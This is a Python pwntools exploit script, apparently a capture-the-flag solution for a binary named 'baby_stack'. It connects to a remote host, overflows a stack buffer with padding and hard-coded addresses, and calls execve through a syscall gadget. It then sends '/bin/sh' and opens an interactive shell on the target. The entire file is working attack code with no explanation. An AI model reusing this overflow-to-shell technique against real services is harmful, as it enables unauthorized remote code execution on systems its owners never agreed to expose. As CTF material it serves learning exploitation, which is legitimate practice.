#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('baby_stack'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT)

pause()
r.sendlineafter('>> ', ';'*0x400 + '/bin/sh\x00')

exp = flat(
'a'*104, 0x000000c82000a2b4,
0x0000000000000007,     0x00000000004c1c00,
0x000000c82000a3a0,     0x000000c820040070,
0x0000000000000070,     0x00007fa48d5491c0,
0x000000c820024008,     0x000000c82000e220,
0x0000000000000020,     0x000000c82000a020,
0x0000000000000007,     0x000000c820037db0,
0x0000000000000020,     0x0000000000000020,
0x000000c820037ea8,     0x0000000000000002,
0x0000000000000002,     0x00000000004c1c00,
0x000000c82000a390,     0x00000000004c1c00,
0x000000c82000a3a0,     0x00007fa48d5491c0,
0x000000c820024008,     0x0000000000537518,
0x0000000000010000,     0x000000c82006a008,
0x0000000000000070,     0x0000000000000ff8,
0x000000c82006a000,     0x0000000000001000,
0x0000000000001000,     0x0000000000000079,
0x0000000000000079,     0x0000000000000000,
0x0000000000000000,     0x0000000000000000,
0x0000000000000001,
)
syscall = 0x496a30
pop_0x30 = 0x404fd3 
exp += flat(0x496a30, 0, 0x3b, 0xc82006e400, 0, 0)
#exp += flat(syscall, 0, 1, 1, 0xc82006e400, 0x200, 0, 0)
r.sendlineafter('>> ', exp)
r.send('/bin/sh'.ljust(0x20, '\x00'))

r.interactive()
